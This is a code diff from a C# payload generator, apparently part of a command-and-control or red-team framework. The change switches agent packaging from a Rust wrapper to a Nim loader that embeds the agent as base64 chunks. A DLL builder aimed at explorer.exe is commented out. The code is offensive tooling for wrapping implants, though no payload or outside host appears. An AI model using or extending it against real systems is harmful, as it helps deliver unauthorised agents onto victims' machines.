@@ -5,8 +5,6 @@ using System.Text;
 using System.Threading.Tasks;
 
 namespace Common.Payload;
-
-using System.IO;
 using Common.Config;
 
 //public enum MessageLevel
@@ -66,7 +64,7 @@ public partial class PayloadGenerator
         {
             case PayloadType.Executable: return this.ExecutableEncapsulation(options, agentbytes);
             case PayloadType.PowerShell: return this.PowershellEncapsulation(options, agentbytes);
-            case PayloadType.Library: return this.LibraryEncapsulation(options,agentbytes);
+            case PayloadType.Library: return this.GenerateLibrary(options,agentbytes);
             case PayloadType.Service: return agentbytes;
             case PayloadType.Binary: return this.BinaryEncapsulation(options, agentbytes);
             default:
@@ -77,43 +75,41 @@ public partial class PayloadGenerator
 
     public byte[] ExecutableEncapsulation(PayloadGenerationOptions options, byte[] agent)
     {
-        var tmpFile = "tmp" + ShortGuid.NewGuid() + ".exe";
-        var tmpPath = this.Working(tmpFile);
-        File.WriteAllBytes(tmpPath, agent);
-
-        var binFile = "tmp" + ShortGuid.NewGuid() + ".bin";
-        var binPath = this.Working(binFile);
-
-        this.MessageSent?.Invoke(this, $"[>] Generating Binary...");
-        var executionResult = this.GenerateBin(tmpPath, binPath, options.Architecture == PayloadArchitecture.x86);
-
-        if (options.IsVerbose)
-            this.MessageSent?.Invoke(this, executionResult.Out);
-
-        File.Delete(tmpPath);
-
-        if(executionResult.Result != 0)
-            return null;
-
-        string agentb64 = Convert.ToBase64String(File.ReadAllBytes(binPath));
-
-        var b64File = "tmp" + ShortGuid.NewGuid() + ".b64";
-        var b64Path = this.Working(b64File);
-
-        using (var writer = new StreamWriter(b64Path))
+        string nimSourceCode = string.Empty;
+        string agentb64 = Convert.ToBase64String(agent);
+        using (var nimReader = new StreamReader(this.Source("payload.nim", options.Architecture, options.IsDebug)))
         {
-            writer.Write(agentb64);
+            nimSourceCode = nimReader.ReadToEnd();
         }
 
-        File.Delete(binPath);
+        var payload = new StringBuilder();
+        foreach (var chunk in this.SplitIntoChunks(agentb64, 1000))
+        {
+            payload.Append("b64 = b64 & \"");
+            payload.Append(chunk);
+            payload.Append("\"");
+            payload.Append(Environment.NewLine);
+        }
 
-        var parms = this.ComputeIncRustBuildParameters(options, b64Path);
+        var nimFile = "tmp" + ShortGuid.NewGuid() + ".nim";
+        nimSourceCode = nimSourceCode.Replace("[[PAYLOAD]]", payload.ToString());
+
+        var nimPath = this.Working(nimFile);
+        using (var writer = new StreamWriter(nimPath))
+        {
+            writer.WriteLine(nimSourceCode);
+        }
+
+        var outFile = "tmp" + ShortGuid.NewGuid() + ".exe";
+        var outPath = this.Working(outFile);
+
+        var parms = this.ComputeNimBuildParameters(nimPath, outPath, options.Architecture == PayloadArchitecture.x86, options.IsDebug);
 
         this.MessageSent?.Invoke(this, $"[>] Generating executable...");
 
         if (options.IsVerbose)
-            this.MessageSent?.Invoke(this, $"[>] Parameters : {string.Join(" ", parms)}");
-        executionResult = this.IncRustBuild(parms);
+            this.MessageSent?.Invoke(this, $"[>] Executing: nim {string.Join(" ", parms)}");
+        var executionResult = this.NimBuild(parms);
 
         if (options.IsVerbose)
             this.MessageSent?.Invoke(this, executionResult.Out);
@@ -124,10 +120,11 @@ public partial class PayloadGenerator
             else
                 this.MessageSent?.Invoke(this, "Build failed.");
 
+        File.Delete(nimPath);
+
         if (executionResult.Result != 0)
             return null;
 
-        string outPath = Path.Combine(this.Config.IncRustPath, "target", options.Architecture == PayloadArchitecture.x64 ? "x86_64-pc-windows-gnu" : "i686-pc-windows-gnu", options.IsDebug ? "debug" : "release", "incrust.exe");
         byte[] bytes = File.ReadAllBytes(outPath);
         File.Delete(outPath);
 
@@ -166,63 +163,68 @@ public partial class PayloadGenerator
         return bytes;
     }
 
-    public byte[] LibraryEncapsulation(PayloadGenerationOptions options, byte[] agent)
+    public byte[] GenerateLibrary(PayloadGenerationOptions options, byte[] agent)
     {
-        var tmpFile = "tmp" + ShortGuid.NewGuid() + ".exe";
-        var tmpPath = this.Working(tmpFile);
-        File.WriteAllBytes(tmpPath, agent);
+        /*if(!options.IsInjected)
+         {
+             this.MessageSent?.Invoke(this, $"[X] Only injected payload is allowed for Library type!");
+             return null;
+         }
 
-        var binFile = "tmp" + ShortGuid.NewGuid() + ".bin";
-        var binPath = this.Working(binFile);
+         string nimSourceCode = string.Empty;
 
-        this.MessageSent?.Invoke(this, $"[>] Generating Binary...");
-        var executionResult = this.GenerateBin(tmpPath, binPath, options.Architecture == PayloadArchitecture.x86);
+         var tmpFile = "tmp" + ShortGuid.NewGuid() + ".exe";
+         var tmpPath = this.Working(tmpFile);
+         File.WriteAllBytes(tmpPath, agent);
 
-        if (options.IsVerbose)
-            this.MessageSent?.Invoke(this, executionResult.Out);
+         var outFile = "tmp" + ShortGuid.NewGuid() + ".bin";
+         var outPath = this.Working(outFile);
 
-        File.Delete(tmpPath);
+         this.MessageSent?.Invoke(this, $"[>] Generating Library...");
+         if (options.IsVerbose)
+             this.MessageSent?.Invoke(this, $"Generating Binary...");
+         var executionResult = this.GenerateBin(tmpPath, outPath, options.Architecture == PayloadArchitecture.x86);
 
-        if (executionResult.Result != 0)
-            return null;
+         if (options.IsVerbose)
+             this.MessageSent?.Invoke(this, executionResult.Out);
 
-        string agentb64 = Convert.ToBase64String(File.ReadAllBytes(binPath));
+         File.Delete(tmpPath);
 
-        var b64File = "tmp" + ShortGuid.NewGuid() + ".b64";
-        var b64Path = this.Working(b64File);
+         if (options.IsVerbose)
+             if (executionResult.Result == 0)
+                 this.MessageSent?.Invoke(this, "Binary generated.");
+             else
+             {
+                 this.MessageSent?.Invoke(this, "Generation failed.");
+                 return null;
+             }
 
-        using (var writer = new StreamWriter(b64Path))
-        {
-            writer.Write(agentb64);
-        }
 
-        File.Delete(binPath);
+         if (options.IsVerbose)
+             this.MessageSent?.Invoke(this, $"Generating dll...");
+         var dllFile = "tmp" + ShortGuid.NewGuid() + ".dll";
+         var dllPath = this.Working(dllFile);
 
-        var parms = this.ComputeIncRustBuildParameters(options, b64Path);
+         var executionResultDll = this.GenerateDll(outPath, dllPath, "explorer.exe");
 
-        this.MessageSent?.Invoke(this, $"[>] Generating executable...");
+         File.Delete(outPath);
 
-        if (options.IsVerbose)
-            this.MessageSent?.Invoke(this, $"[>] Parameters : {string.Join(" ", parms)}");
-        executionResult = this.IncRustBuild(parms);
+         if (options.IsVerbose)
+             this.MessageSent?.Invoke(this, executionResultDll.Out);
+         if (options.IsVerbose)
+             if (executionResultDll.Result == 0)
+                 this.MessageSent?.Invoke(this, "Dll generated.");
+             else
+             {
+                 this.MessageSent?.Invoke(this, "Generation failed.");
+                 return null;
+             }
 
-        if (options.IsVerbose)
-            this.MessageSent?.Invoke(this, executionResult.Out);
+         byte[] bytes = File.ReadAllBytes(dllPath);
+         File.Delete(dllPath);
 
-        if (options.IsVerbose)
-            if (executionResult.Result == 0)
-                this.MessageSent?.Invoke(this, "Build succeed.");
-            else
-                this.MessageSent?.Invoke(this, "Build failed.");
-
-        if (executionResult.Result != 0)
-            return null;
-
-        string outPath = Path.Combine(this.Config.IncRustPath, "target", options.Architecture == PayloadArchitecture.x64 ? "x86_64-pc-windows-gnu" : "i686-pc-windows-gnu", options.IsDebug ? "debug" : "release", options.Type == PayloadType.Library ? "incrustlib.dll" : "incrust.exe");
-        byte[] bytes = File.ReadAllBytes(outPath);
-        File.Delete(outPath);
-
-        return bytes;
+         return bytes;*/
+        return null;
     }
 
     public byte[] PowershellEncapsulation(PayloadGenerationOptions options, byte[] agent)
